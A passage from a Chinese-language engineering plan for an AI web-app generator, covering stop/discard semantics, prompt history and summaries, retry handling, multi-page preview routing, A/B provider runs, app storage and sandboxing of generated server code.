### 0.2 三处需要修正的认知（这是本文最有价值的部分）

**① P0-1「现在停止会等当前文件写完」——不成立。**
`abortGeneration()` 直接 `controller.abort()`，`llm.ts` 的 `fetch` 立刻中断，`runner.ts:223` 在下一个 chunk 就 `break`。写了一半的文件由 `parser.end()` 收尾并标记 `truncated`，`runner.ts:197-207` 会把它从 `completed` 里剔除，`partialFiles()` 因此把它**回退到旧内容**。
你感知到的"等一下"，来自前端 `Studio.tsx:262` 的 `await refresh()`——停止后要等一次完整的项目 GET 回来才弹 toast。这是**落库回读的延迟**，不是文件收尾的延迟。
所以 P0-1 真正缺的不是"更快地停"，而是：**没有一个"连已完成文件也不要"的语义**，以及 UI 上"停止"这一个按钮同时承担了"保留"和"放弃"两种预期。

**② P0-2 的瓶颈不是文件多，是"没有历史"。**
`editTurnMessages()`（`prompts.ts:129-150`）发出去的东西只有三样：设计参数、当前文件内容、这一句新指令。**一条历史消息都没有。**
所以第 12 轮说"改成刚才那个深色"，模型根本不知道"刚才"指什么——这不是预算问题，是记忆问题。只做"摘要 + 检索"而不补历史，长会话照样退化。

**③ P2-13 最贵的两个缺口不在清单里。**
- 宿主 React 崩溃 = 整页白屏（`main.tsx` 直接 `createRoot().render()`，全仓无 `ErrorBoundary`）；
- 生成中断线时，`finally` 里 `setLive(EMPTY_LIVE)`（`Studio.tsx:297`）会把**已经收到的文件全部丢掉**，用户看到的是"白忙一场"，而这恰恰是本项目"过程可见"卖点的反面。

## 2. P0：三件事的实现方案

### 2.1 停止语义拆分：`keep` vs `discard`

**目标**：一个按钮两种结局，且**用户能预期**。

**协议变更**

```ts
// shared/types.ts
export interface StopRequest {
  /** keep = 保留本轮已写完的文件（现状，默认）；discard = 本轮一个文件都不留 */
  mode?: 'keep' | 'discard'
}

// done 事件增加一个字段
| { type: 'done'; version: number; usage: Usage; provider?: ProviderInfo
    partial?: boolean; kept?: number; discarded?: boolean }
```

**服务端改动（4 处）**

```ts
// generation.ts:31 —— 句柄从 controller 升级为 { controller, mode }
interface RunHandle { controller: AbortController; mode: 'keep' | 'discard' }
const running = new Map<string, RunHandle>()

export function abortGeneration(projectId: string, mode: 'keep' | 'discard' = 'keep'): boolean {
  const handle = running.get(projectId)
  if (!handle) return false
  handle.mode = mode            // 先定语义，再中断：顺序反了会读到旧模式
  handle.controller.abort()
  return true
}
```

```ts
// routes/projects.ts:104 —— 读 body，缺省 keep（老客户端不受影响）
route('/api/projects/:id/stop', ['POST'], async ({ req, res, params }) => {
  const body = await readJson<StopRequest>(req)   // 空 body 返回 {}，不会抛
  const mode = body.mode === 'discard' ? 'discard' : 'keep'
  if (!abortGeneration(params['id']!, mode)) throw new HttpError(409, 'busy', '当前没有进行中的生成')
  sendJson(res, 200, { ok: true, mode })
})
```

```ts
// generation.ts —— 在 commit 之前插入"丢弃"分支（约 line 280 位置）
// handle 是 handleGeneration 里的局部变量（见下），不查 Map：Map 在 finally 里已经删了
const discarded = aborted && handle.mode === 'discard'
if (discarded) {
  await store.appendMessage({
    projectId, role: 'agent', kind: 'notice',
    content: '已放弃本轮生成，项目保持在上一个版本，未改动任何文件。',
    meta: { discarded: true, prompt },
  })
  if (!sse.gone) {
    send({ type: 'done', version: project.version, usage: sink.usage, partial: true, kept: 0, discarded: true })
    sse.end()
  }
  return
}
```

对应的 `handleGeneration` 头部（替换 `generation.ts:151-156`）：

```ts
const handle: RunHandle = { controller: new AbortController(), mode: 'keep' }
const sse = openSse(res, () => handle.controller.abort())
const send = sse.send
running.set(projectId, handle)
```

> 实现注意两点：① `abortGeneration` 必须**先写 `handle.mode` 再 `abort()`**——顺序反了，中断回调可能先跑起来，读到的是上一轮的模式；② 不要在 commit 时再去 `running.get()`：`running.delete(projectId)` 发生在 `finally`（`generation.ts:184-186`），那时 Map 里已经没有这条了。`handle` 由 `handleGeneration` 直接持有即可。

**前端改动**

- `api.ts`：`stop(id, mode)` 加参数。
- `RunStatusBar.tsx`：主按钮文案改为「停止并保留」；右侧加一个 `Dropdown.Button` 或 `Popconfirm` 的「放弃本轮」，Esc 仍绑定 `keep`（保守默认）。
- `Studio.tsx`：`enqueue` 里捕获 `event.discarded`，finally 后按三种结局分别弹 toast。

**测试**（`tests/server.test.ts` 现有 stop 用例旁边加 2 条）

1. `stop{mode:'keep'}`：版本 +1、`kept>0`、`done.partial=true` —— 与现状等价（回归保护）。
2. `stop{mode:'discard'}`：`version` 不变、`files` 逐字节不变、`versions.length` 不变、`done.discarded=true`、消息流里多一条 notice。

**工期** 0.5 天（含测试）。**风险** 低。**净收益**：消掉"我明明点了停止，它还是改了我的文件"这类投诉。

### 2.2 会话历史 + 滚动摘要 + 片段检索

**目标**：第 20 轮和第 2 轮的上下文质量一致。

**分三层，按成本递增，可独立上线**

#### 第 1 层：把历史接进上下文（0 成本，0.5 天）

```
// prompts.ts
export function historyBlock(messages: Message[], summary?: string): string
```

- 取 `store.detail(projectId).messages`，过滤 `role==='user' | kind==='plan'`；
- 只保留**最近 8 条**，每条 `content.slice(0, 120)`，附版本号与"改了哪些文件"（`meta.changed` 已经在写了，`generation.ts:343`）；
- 输出 `<history>` 段，插在 `editTurnMessages` 的 user content **最前面**（在文件清单之前），因为"最近在做什么"决定读文件的方式。

预算：8 × 120 ≈ 1 KB，相对 24 KB 预算可忽略。

#### 第 2 层：规则摘要（0 成本，0.5 天）

不做模型调用，纯确定性拼装：

```
<summary>
项目：小账本（记账应用）
已完成的改动：
- v1 初始版本：生成 index.html / styles.css / app.js
- v2 主色换成墨绿：改 styles.css
- v3 加分类占比条：改 app.js、styles.css
当前约束：主色 #2F5D50；数据存 localStorage（nucleus:*）
</summary>
```

来源全是已有数据：`versions[].label` + `versions[].changed` + `project.design`。**优点**：零 token、零延迟、完全可测、不会编造。

#### 第 3 层：模型摘要（可选开关，1 天）

仅当 `messages.length > 12` 且距上次摘要 ≥ 4 轮时触发：

```ts
// runner.ts：AgentEngine 增加可选方法
summarize?(history: string): Promise<string>
```

- 用**同一条通道**发一次 `maxTokens: 300` 的调用，system prompt：「把以下对话压成 5 条以内的项目约束，不要复述代码」；
- 失败/超时（8s）静默降级到第 2 层；
- 结果写 `Project.context`：

```ts
// shared/types.ts
export interface Project {
  // ...
  context?: {
    summary: string
    /** 摘要覆盖到哪条消息，避免重复摘要 */
    untilMessageId: string
    updatedAt: number
  }
}
```

`store` 层只是多存一个可选对象，`schema` 不用升（`2` 仍然兼容：老库没有该字段 → `undefined`）。

**成本控制**：摘要调用会额外花 token，所以要满足"`>12` 轮才触发 + 最多每 4 轮一次"，并把这次调用的 `usage` 记在 `meta.summaryUsage` 里，界面上不显示（避免用户以为生成变贵了）。

#### 第 3.5 层：片段检索（1 天，与第 3 层可并行）

解决"整份文件被截断到 600 字符，恰好没给到需要改的那段"：

```ts
// prompts.ts
function excerpts(text: string, tokens: string[], window = 8, maxChars = 1200): string
```

- 对**未被选中或已被截断**的文件，按行扫描命中 token 的行，取 ±8 行窗口，合并相邻窗口；
- 输出 `<excerpt path="app.js" lines="120-168">…</excerpt>`；
- manifest 里该文件标为「片段检索（命中 x 处）」而不是「未提供」。

**风险**：模型看到片段后可能"以为整份文件就这么长"从而重写。缓解：每段 excerpt 前后加 `// …（此处省略 N 行）…` 标记，并在提示词里明确"excerpt 不是完整文件，不要整份重写"。

**测试**（`tests/context.test.ts`）

1. 12 轮历史 → `historyBlock` 含第 1 轮的关键决定，长度 ≤ 1.2 KB；
2. 规则摘要包含每个版本的 `changed` 文件名；
3. 一个 5000 行 `app.js` + 一条"改第 240 行附近的价格格式" → 产出 excerpt 且预算不超；
4. 摘要调用超时 → 降级不抛错（用 `tests/fake-upstream.ts` 模拟 hang）。

**工期** 第 1+2 层 1 天；第 3 层 +1 天；第 3.5 层 +1 天。

### 2.3 错误重试：把"原指令"变成一等公民

**现状（精确）**

```ts
// Studio.tsx:468
const retryPrompt = input.trim() || lastFailedPromptRef.current || ''
```

两处问题：

1. **优先级反了**：输入框有字就用输入框——用户失败后随手在输入框里打了个草稿，点"重新生成"发的就是这个草稿。
2. **只在内存里**：`lastFailedPromptRef` 是 `useRef`，刷新页面/切项目就没了；而且服务端落库的错误消息 `meta` 只有 `{code, tried}`（`generation.ts:274`），没有 prompt。

**方案**

| 层 | 改动 |
| -- | ---- |
| 服务端 | `generation.ts:269-275` 的 `appendMessage` 里 `meta` 增加 `prompt`（原样，≤2000 字） |
| 类型 | `Message.meta` 已是 `Record<string, unknown>`，不用改 |
| 前端取数 | 新增 `lastFailed(projectId)`：优先 `messages` 里最后一条 `kind==='error'` 的 `meta.prompt`，其次 localStorage `nucleus.failed.<id>`，最后才是输入框 |
| 交互 | 错误条按钮改为「用原指令重试」（主）+「用新描述重试」（仅当输入框非空时出现，次） |
| 历史消息 | `ChatStream` 的错误气泡（`ChatStream.tsx:586-620`）加同款按钮，让"三分钟前那次失败"也能一键重试 |
| 幂等 | 重试前清 `error` state 并 `setInput('')`，避免"重试后又把旧文案塞回输入框" |

**顺手修一处**：`Studio.tsx:378-380` 的 `api.stop().catch(() => {})` 把 409（"当前没有进行中的生成"）也吞了——用户点停止毫无反馈，会以为按钮坏了。应区分处理：409 提示"这一轮已经结束了"，其余错误提示"停止失败，请稍后重试"。

**测试**：`tests/server.test.ts` 断言失败消息 `meta.prompt` 等于入参；前端纯函数 `pickRetryPrompt(messages, input, storage)` 加单测（3 个优先级分支）。

**工期** 0.5 天。

## 3. P1：三件事的实现方案

### 3.1 多页面 + 路由

**现状为什么不行**

- `assemble.ts:145-159` `pickEntry()` 只挑**一个** `index.html`，其他 HTML 完全不参与组装；
- `inlineStylesheets/inlineScripts` 只处理**入口文件里的引用**；
- `srcdoc` 文档没有可用的基址，`<a href="pages/about.html">` 点击必然 404；
- 提示词（`prompts.ts:50`）明确写「文件数 ≤ 5」，压根没提多页面。

**设计：预览用虚拟路由壳，导出保留真实多文件**

这是本方案最关键的一个取舍。理由：`srcdoc` 里无法提供第二个 URL，而导出到静态服务器时多文件天然可用。强行统一成一套会两边都做不好。

```
                 ┌─────────────────────────────┐
   生成 files ──▶│ collectPages(files)         │
                 │  index.html        → "/"     │
                 │  pages/about.html  → "/about"│
                 └──────────┬──────────────────┘
                            │
          ┌─────────────────┴──────────────────┐
          ▼                                    ▼
  预览（srcdoc 单文档）                  导出（ZIP 多文件）
  每个页面 → <div data-page="/about" hidden>   每个页面 → 完整 HTML 文档
  + 共享 <style> 去重                        + 共享 styles.css
  + 路由脚本（hash）                          + 相对链接原样保留
```

**新增 `shared/preview/pages.ts`**

```ts
export interface PageUnit {
  route: string        // '/', '/about'
  path: string         // 'index.html', 'pages/about.html'
  body: string         // <body> 内容（去掉 <script>）
  scripts: string[]    // 该页的脚本（按原顺序）
  styles: string[]     // 该页的 <style> 片段
  title: string
}

export function collectPages(files: FileEntry[]): PageUnit[]
export function assembleMultiPage(files: FileEntry[], tweak?: DesignTweak): AssembleResult
```

**页面脚本的作用域问题（这是真正的难点，不是路由）**

多个页面的脚本会被塞进同一个文档，`document.getElementById('app')` 会互相踩。三种处理，按可靠性排序：

| 方案 | 做法 | 可靠性 | 代价 |
| ---- | ---- | ------ | ---- |
| A | 提示词要求每个页面脚本以 `document.querySelector('[data-page="about"]')` 为根 | 中 | 依赖模型守约，需自检兜底 |
| B | 组装时把每页脚本包进 `(function(root){ ... })(document.querySelector(...))`，并把页内 `document.getElementById` 静态替换为 `root.querySelector` | 中高 | 正则改写有风险（字符串里出现同名字样会误改） |
| C | 每页独立 `iframe`（嵌套 srcdoc），父壳只负责切显隐 | **高** | 跨页状态（localStorage shim）需要每帧各自注入种子；体积翻倍 |

**建议 A + 自检兜底**（不做正则改写，避免制造更难查的 bug）：

- 提示词给出 3 行模板：
  ```html
  <!-- pages/about.html -->
  <section class="page" data-page="about">…</section>
  <script data-page-script="about">
    const root = document.querySelector('[data-page="about"]');
    // 所有查询都从 root 出发
  </script>
  ```
- 新增自检 `pages:scope`（block 级）：页面脚本里出现 `document.getElementById|querySelector` 而未先取 `[data-page=...]` 根 → 直接判失败，进修复轮（复用现有 `repair` 机制，`generation.ts:201-247`）。这条检查比事后调试便宜得多。

**路由脚本（注入到壳里，`data-nucleus="router"`）**

```js
(function () {
  var pages = [].slice.call(document.querySelectorAll('[data-page]'));
  function go(route) {
    var hit = false;
    pages.forEach(function (p) {
      var on = p.getAttribute('data-page') === route;
      p.hidden = !on;
      if (on) hit = true;
    });
    document.title = (document.querySelector('[data-page="' + route + '"]') || {}).dataset.title || document.title;
    if (!hit) location.hash = '#/';
  }
  addEventListener('hashchange', function () { go(location.hash.replace(/^#/, '') || '/'); });
  addEventListener('click', function (e) {
    var a = e.target.closest && e.target.closest('a[href]');
    if (!a) return;
    var href = a.getAttribute('href');
    if (!href || /^(https?:|mailto:|tel:|#)/.test(href)) return;
    e.preventDefault();
    location.hash = '#' + href.replace(/^\.?\//, '/').replace(/\.html?$/, '').replace(/^\/?$/, '/');
  });
  go(location.hash.replace(/^#/, '') || '/');
})();
```

**导出侧**：`export.ts` 改为对每个 `PageUnit` 生成完整文档（共享 head + 该页 body），链接保持 `pages/about.html` 原样——放到任意静态服务器就是真的多站点。

**提示词改动**

- 增加「多页面约定」小节（页面放 `pages/`，链接用相对路径，脚本必须取 `[data-page]` 根）；
- 提示词里的「文件数 ≤ 5」提到 8（`prompts.ts:50`；硬上限 `MAX_FILES = 24` 不动），总量仍 400 KB。

**测试**

1. `assemble.test.ts`：2 页面 + 共享 `styles.css` → 产出含两个 `[data-page]`、`inlined` 去重、`missing=[]`；
2. `assemble.test.ts`：页面脚本未取根 → `checks` 里 `pages:scope` 为 false 且进 `broken`；
3. `e2e.mjs`：点击导航 → 断言第二页的标题/文案出现（用 `iframe.contentFrame()`）。

**工期** 2 天（比清单里的 1 天多，主要花在脚本作用域与导出双写）。**风险** 中：这是唯一会改动"组装器契约"的一项，`assemble()` 的调用点有 4 处（`runner.ts`、`preview.ts`、`Studio.tsx` 的 `livePreviewHtml`、`export.ts`），要保持签名兼容（新增可选参数，默认走单页分支）。

### 3.2 多通道 A/B（成本可控的 Race Mode）

**现状**：`resolveChain()` 返回**有序链**，`handleGeneration` 是 `for` 循环串行尝试（`generation.ts:166-183`），只有"这家不可用且本轮零产出"才进下一家（`canFailover`，`runner.ts:298-301`）。这是 failover，不是 race：同一时刻只有一份输出、一个 sink、一条事件流。

**设计**

**① 触发条件（成本闸门）**

```ts
// 只允许"两家都有 Key 且都非 free"同时跑
const racers = chain.filter(p => !p.profile.free).slice(0, 2)
if (racers.length < 2) throw new HttpError(409, 'busy', 'A/B 需要两家已配置 Key 的通道')
```

免 Key 通道禁止参赛：它有 30s/IP 的硬配额（`queue.ts`），并行只会让两边都排队，用户等 60 秒拿到两份慢结果。

**② 事件流：用包装事件，不动 11 种既有类型**

```ts
// shared/types.ts —— 唯一新增的传输事件
| { type: 'lane'; lane: 'a' | 'b'; event: AgentEvent }
```

好处：`Studio.applyEvents` 只需在 switch 前加一层解包，既有 11 个分支一行不改；测试里既有的 `AgentEvent` 断言全部继续有效。

```ts
// generation.ts —— handleRace 核心（与 handleGeneration 并列，不复用它的 commit 段）
const lanes = racers.map((p, i) => ({ lane: i === 0 ? 'a' : 'b', provider: p, sink: createSink(base.files, base.plan) }))
await Promise.all(lanes.map(l => pump(l, send)))   // pump 内部 for-await，事件包成 {type:'lane', lane, event}
```

**③ 两份结果不自动落库**

这是与"串行 failover"最大的行为差异。race 结束后：

```ts
interface RaceResult {
  id: string                  // r_xxxx
  projectId: string
  prompt: string
  lanes: {
    lane: 'a' | 'b'
    provider: ProviderInfo
    files: FileEntry[]
    checks: Check[]
    missing: string[]
    broken: string[]
    usage: Usage
  }[]
  createdAt: number
}
```

- 写 `data/race.json`（复用 `store` 的原子写：tmp + rename），10 分钟后过期；
- SSE 发 `done{partial:true, kept:0, race:{id, lanes:[...]}}`，**不产生版本**；
- 前端右侧变成"左右分屏"，两个 `iframe` 各挂一份 `assemble()` 结果，下方对比条：自检通过数 / 耗时 / token / 文件数；
- 用户点「用这份」→ `POST /api/projects/:id/race/:raceId/choose {lane}` → 服务端把该 lane 的 files 走一次正常 `store.commit()`（label 记 `A/B 选定 · <provider>`）→ 返回新版本。

**④ 偏好沉淀**

选择结果追加到 `data/preferences.json`：

```json
{ "at": 1762…, "projectId": "p_x", "promptHash": "…", "winner": "aliyun",
  "loser": "deepseek", "checks": { "a": 8, "b": 7 }, "ms": { "a": 41000, "b": 58000 } }
```

用途两个，都不要过度设计：

1. **默认顺序**：下次 race 时按 `胜率 × 0.6 + 自检通过率 × 0.4` 排 A/B 位（A 位在 UI 上默认靠左，纯展示偏好）；
2. **诚实展示**：设置页每个通道显示「在你的项目里 A/B 胜率 62%（13 次）」。这是真实数据，不是编的评分。

**⑤ 成本提示**

UI 上必须在发起前说清楚：「A/B 会同时调用两家模型，本次消耗约双倍 token」，并在 `done.race` 里回报两条 `usage`。否则这是最容易引发"你们偷偷多收钱"质疑的功能。

**测试**

1. `tests/server.test.ts` + `fake-upstream.ts` 起两个假上游，断言 `lane` 事件交错、两边都 `file_end`、`versions.length` 未变；
2. `choose{a}` → 版本 +1 且文件来自 a；
3. 只有一家 Key 时 `409`；
4. race 中途 `stop` → 两边都 abort，不落库。

**工期** 2 天（后端 1.2 + 前端分屏 0.8）。

| `icons` | info | N 个图标已解析 / M 个未识别 |

### 4.2 数据库型应用（4–5 天）

**关键设计：切换存储不该重写业务代码**

现在生成物直接调 `localStorage`（`assemble.ts:109-128` 的 shim）。做云端存储时如果让模型改调 `fetch`，那"同一份代码既能单机又能上云"就不成立了，切换等于重生成。

**方案：注入统一运行时，模型只认一个 API**

```html
<script data-nucleus="store">
  window.NucleusStore = {
    async get(key) {},          // 单条
    async set(key, value) {},
    async list(collection) {},  // 集合
    async remove(key) {}
  };
</script>
```

- 单机模式：内部就是 `localStorage` + `nucleus:` 前缀（现在已经是这个行为）；
- 云端模式：内部 `postMessage` RPC 到宿主，宿主转 `/api/apps/:projectId/data`；
- 提示词只要求「用 `NucleusStore` 读写，不要直接碰 `localStorage`」；
- 现有 storage shim 的 `postMessage` 通道（`assemble.ts:118-127`）已经存在，RPC 复用同一套，只是双向。

**为什么走 postMessage 而不是直接 `fetch`**：沙箱 iframe 没有 `allow-same-origin`，`Origin` 是 `null`；直接 `fetch` 要服务端开 `ACAO: *` + 预检，且把"宿主 API"暴露给不可信代码。postMessage 由宿主代发，鉴权、限流、字段校验都在可信侧，且导出后（无宿主）自动降级为 `localStorage`。

**服务端**

```
POST /api/apps/:projectId/data   { op: 'get'|'set'|'list'|'remove', collection, key, value }
```

- 存储：`data/appdata/<projectId>.json`（按应用分文件，避免一个巨大 JSON）；
- 配额：每应用 200 KB / 5000 条，每访客每分钟 120 次写；
- 权限：`createdBy` 可见写；分享页访客默认只读（投影成 `readonly: true` 注入）。

**提示词分支**：`<plan>` JSON 增加可选字段 `"storage": "local" | "cloud"`；服务端据 plan 决定注入哪种 `NucleusStore` 实现。同一个界面代码两种后端，这是本项的核心价值。

**风险**：一旦有云端数据，就要有"数据归谁、能不能删、分享给谁看"的规则——这部分想清楚之前别上线，否则会变成隐私债。

### 4.4 多智能体工作流的可视化（3–4 天，但我建议先不做）

**为什么现有设计不做它**（README 已明说）：一次 LLM 调用切成"产品经理 / 架构师 / 工程师"三段，**成本、延迟、一致性都不变，变的只是文案**。在没有评测手段证明"分角色提示词真的让代码更好"之前，它是纯表演。

**如果一定要做，做成"可开关 + 可证伪"**

**协议扩展**：不加 3 个标签，加 1 个带属性的标签（`<role name="pm">`），解析器只多一个 mode：

```ts
// protocol.ts
private mode: 'outside' | 'plan' | 'file' | 'role'
const ROLE_OPEN = /<\s*role\s+name\s*=\s*["']([a-z]+)["']\s*>/i
const ROLE_CLOSE = /<\s*\/\s*role\s*>/i
```

**关键约束（不写会出 bug）**：`role` 只在 `outside` 模式识别；`file` 模式内**绝不**解析 role——生成的文件内容里出现 `<role>` 字样是合法的（比如写一个关于"角色"的页面）。

**事件**：`role_start / role_delta / role_end`，前端渲染成"接力条 + 每人一句话"。**不要做"头像会议桌"**：那会把用户的注意力从代码质量转移到动画上，且一旦模型输出跑偏（角色串话），界面会显得很假。

**最大的技术风险不是解析，是预算**：角色独白会挤占 `maxTokens`，文件截断率上升（现有 repair 轮只能救 2 次）。缓解：每个角色硬限 200 字（提示词 + 解析侧截断），或把角色段放在**文件全部写完之后**（作为"复盘"而不是"开会"），这样不影响首字延迟与截断。

**评估方式**：跑 10 个固定 prompt × 2 组（开/关），比 `checks` 通过率、截断率、repair 轮次、总耗时。**通过率没有显著提升就不上**——这是我建议暂缓的全部理由。

### 4.6 后端 BFF / Serverless（1.5–2 周，且必须排在 #8 与 #11 之后）

**为什么必须有先后**：让模型写服务端代码，等于让不可信代码在**你的进程**里跑。没有 #11 的隔离与 #8 的数据边界，这就是给自己开一个 RCE。

**设计（不接第三方 Serverless，做进程内多租户）**

```ts
// 生成物新增：api/hello.js
export default async function handler(req, ctx) {
  return { status: 200, body: { ok: true, at: Date.now() } }
}
```

- 路由：`/a/:projectId/:path*` → 查 `project.files` 里的 `api/<path>.js`；
- 执行：**`worker_threads` + `resourceLimits: { maxOldGenerationSizeMb: 32 }` + 2s 超时 `terminate()`**。这是唯一能真正杀死死循环的方案（`node:vm` 不是安全边界，`AsyncLocalStorage` 也拦不住 CPU 忙等）；
- 网络：默认不给 `fetch`；需要时给白名单（用户显式勾选域名）；
- 数据：`ctx.db` 接到 §4.2 的 `AppDataStore`；
- 依赖：禁止 npm（无 bundler），白名单内置 `crypto`/`uuid`；
- 配额：每 app 每分钟 60 次、每请求 2s、并发 4。

**"自动部署"**：不建议真发布到第三方。同一进程内按 `projectId` 路由已经是"全栈闭环"，且不会有供应链与配额问题。真部署是另一个产品（要处理域名、证书、回滚、计费）。

### 4.7 边缘情况：三处硬缺口 + 四处打磨

**已有（做得比多数 Demo 好）**

| 场景 | 实现 |
| ---- | ---- |
| 生成中 | `RunStatusBar`：阶段 + 分段 + 百分比 + 当前文件 + 已用时 + 停止（全界面唯一状态出口） |
| 首字节前 | `PreviewBuilding` 骨架屏 + 状态卡 + 待生成文件 chips |
| 代码跟随 | `CodePanel followPath=runningFileRef` 自动跟随正在写的文件 |
| 错误可处置 | `lib/errors.ts` 9 条规则 → 「发生了什么 / 为什么 / 现在点哪里」 |
| 运行时自愈 | 浮条 → `heal()` 拼错误清单 → 让 Agent 修（`Studio.tsx:361-368`） |

**缺口 1：没有 ErrorBoundary（白屏级）**

`main.tsx` 直接 `render(<App />)`。任何渲染期异常（很可能是 `project.files` 结构异常、或 antd 版本行为差异）= 整页白屏，连"回首页"都没有。

```tsx
// src/components/AppBoundary.tsx
class AppBoundary extends React.Component<{children: React.ReactNode}, {error: Error | null}> {
  state = { error: null as Error | null }
  static getDerivedStateFromError(error: Error) { return { error } }
  componentDidCatch(error: Error, info: React.ErrorInfo) {
    // 带上 build.commit，便于对着线上判断是哪一版
    console.error('[nucleus] 宿主渲染失败', error, info.componentStack)
  }
  render() {
    if (!this.state.error) return this.props.children
    return <Result status="error" title="界面出了点问题"
      subTitle={`${this.state.error.message.slice(0, 120)}｜构建 ${BUILD.commit}`}
      extra={[<Button key="home" href="#/">回首页</Button>,
              <Button key="reload" onClick={() => location.reload()}>重新加载</Button>]} />
  }
}
```

**缺口 2：没有离线感知**

`src/` 里没有任何 `online/offline` 监听。断网时 SSE 的 `reader.read()` 会挂住或抛错，表现为"卡住很久 → 弹一句'未完成的改动不会写入'"。

- 顶部常驻条：`offline` 事件 → 「网络已断开，正在进行的生成会中断」；`online` → 「已恢复」3 秒后消失；
- `generate()` 的读循环加 **idle 超时**：45 秒无任何帧 → `throw new ApiError(0, 'llm_timeout', '连接中断')`，而不是无限挂起；
- 断线时**不要**清空 `live`：`Studio.tsx:297` 的 `setLive(EMPTY_LIVE)` 改为保留 `files` 并标 `interrupted: true`，界面显示"连接中断，已收到 2 个完整文件（未落库）"+ 「重试」/「放弃」。这条直接决定用户会不会觉得"白等了 40 秒"。

**缺口 3：生成中刷新页面 = 静默失败**

服务端在 `res.on('close')` 里 `onAbort()`（`sse.ts:25-28`），所以刷新会中断生成且不落库，用户回来只看到旧版本，没有任何解释。最小修法：`sessionStorage` 记 `nucleus.running.<projectId> = {startedAt, prompt}`，进入 Studio 时若发现标记且服务端无运行中任务 → 弹一条「上次生成因页面关闭而中断，要重新跑一次吗？」+ 原指令（复用 §2.3 的 prompt 落库）。

**打磨（各 0.2 天）**

1. 生成中切到「版本」页签，回滚按钮仍可点：`Studio.tsx:654` 只传了 `busy={rolling}`，没传"生成中"。此时回滚会和正在跑的生成抢同一份文件，落库结果取决于谁先到 → 生成中应禁用回滚并提示「等这一轮跑完」；
2. 项目列表无分页（`route('/api/projects')` 全量返回），>200 个项目时首屏会卡，且列表 30s 缓存会把它放大；
3. `api.stop()` 失败被 `.catch(() => {})` 吞掉（见 §2.3），409 时用户点停止毫无反应。

**工期** 缺口 1+2+3 共 1.5 天，打磨 0.5 天。

## 7. 我不建议现在做的两件事

**① 多智能体"AI 团队开会"（#10）**
不是做不出来，是**做了无法证明它有用**。一次调用切成三角色，token 成本、延迟、一致性都不变，唯一变化是输出多了两段独白；而独白会挤占 `maxTokens`，直接抬高文件截断率——这会让现有的 repair 轮（最多 2 次）更频繁触发，端到端体验反而变差。
如果最终要做，顺序必须是：先建评测集（10 个固定 prompt）→ 跑 A/B → 通过率显著提升才上线。**没有评测的多智能体就是动画。**

**② BFF / 自动部署（#12）**
让模型写服务端代码，等于让不可信代码进你的进程。它严格依赖两件现在没有的事：能真正杀死死循环的执行隔离（worker + terminate），以及"这些数据归谁"的边界（#8/#9）。
在演示阶段，"导出 ZIP 就能跑"已经满足"带走"的需求；BFF 的用户价值只有在"用户想把应用给朋友用"时才出现，而那需要账号体系（#9）。**顺序错了就是给自己开 RCE。**

### 9.1 停止语义拆分 `keep` / `discard`

| 层 | 文件 | 改动 |
| --- | --- | --- |
| 契约 | `shared/types.ts` | 新增 `StopMode = 'keep' \| 'discard'`；`done` 事件加 `discarded?: boolean` |
| 编排 | `server/services/generation.ts` | `running` 由 `Map<string, AbortController>` 改为句柄 `{ controller, mode }`；`abortGeneration(id, mode)` 在中断**之前**写 mode；新增丢弃分支：不 commit、不升版本，落一条 notice |
| 路由 | `server/routes/projects.ts` | `/stop` 读 body 的 `mode`，解析失败回落 `keep`，响应回带 `mode` |

**验收**：`IT-17`（keep，保留并落版）与 `IT-18b`（discard：`version` 仍为 0、`files` 为空、`versions` 为空、历史里有「已放弃」）双双通过。另修掉一个静默问题：`keep` 且一个文件都没写完时，以前不留任何记录，用户那句话挂在那里像发出去就没了 —— 现在会留一条「已停止：这一轮还没有任何文件写完」。

### 10.1 会话历史 + 摘要（§2.2）

没有历史，第 10 轮和第 1 轮对模型来说完全一样：它不知道上一轮改过什么、承诺过什么，
于是长会话必然退化——这是"能不能长期用"的分水岭，不是体验优化。

| 层 | 文件 | 改动 |
| --- | --- | --- |
| 新增 | `server/agent/history.ts` | `historyBlock()` 取最近 8 轮、每句裁到 100 字；`summaryBlock()` 把最近 5 个版本压成 `v3 换成深色：styles.css`；`projectContext()` 拼装 |
| 提示词 | `server/agent/prompts.ts` | `editTurnMessages(..., context)`：文件预算先扣掉上下文长度（下限 8000 字节），上下文排在文件清单之前 |
| 编排 | `server/services/generation.ts` | **先取上下文、再写用户消息**——顺序反了就会把本轮指令当历史重复一遍 |
| 引擎 | `server/agent/runner.ts` | `GenContext` 增加 `history`，逐字透传 |

**三个刻意的取舍**

1. **不丢历史、只裁长度**：早期做法是"超预算就整段丢弃"，结果是模型第 9 轮突然不知道自己
   在改什么。现在按"越近越完整"截断，最近的 3 轮几乎原样保留。
2. **摘要只写"变了什么"**：`v2 加日历：app.js、index.html` 比 `v2 用户要求加日历` 有用得多——
   前者能直接推出"这几个文件是相关的"。
3. **agent 消息优先读 `meta.changed`**：模型自己写的长解释会挤掉真正有用的行，文件清单才是结构化信息。

**验收**：`tests/history.test.ts` 11 条（裁剪、去重、当前指令不重复出现、空历史返回空串）；
`IT-18d` 断言 `<history>` / `<summary>` 真的进了请求体，且当前指令只出现一次。

### 10.2 多页面 + 路由（§3.1）

难点不是路由，是**"预览只有一个 `srcdoc`"**。把 N 个页面塞进同一个文档，`getElementById('app')`
会互相踩；用正则改写脚本里的选择器又太脆（字符串里出现同名字样就误伤）。

**做法：每页一个独立文档 + 一层路由壳**

| 文件 | 职责 |
| --- | --- |
| `shared/preview/pages.ts`（新） | `pageRoute()` 路径→路由（`pages/about.html`→`/about`）；`collectPages()` 收集去重；`buildShell()` 生成壳 |
| `shared/preview/assemble.ts` | `assembleMultiPage()`：每页 `buildDocument()` 一次，再套壳；检查项与单页一一对应 |
| `shared/preview/icons.ts` | 无关，但同批（见 §10.3） |

壳只做三件事：按路由显隐 frame、把页内链接翻成路由切换、把 `localStorage` 写入广播给其它帧。

**踩过的四个坑（都会让现象看起来像"功能没做"）**

1. **相对路径按站点根解析**：`pages/about.html` 里的 `../styles.css` 被当成"缺文件"。
   `normalize()` 必须带上"引用方所在目录"，否则多页项目第一次组装就红一片。
2. **`pages/index.html` 变成 `/pages`**：`pages/` 前缀要在 `/index` 剥离**之前**处理，顺序反了差一层。
3. **壳脚本里出现裸 `</script>`**：内嵌文档会被当成 HTML 解析，整页白屏 + 一句 `Unexpected token '<'`。
   收尾标签必须写成 `<\/script>`，连注释里都不能出现这串。
4. **跨页 `localStorage` 静默失效**：壳写 `__NUCLEUS_CARRY__`、桥读 `__NUCLEUS_CARRY`（少一个下划线），
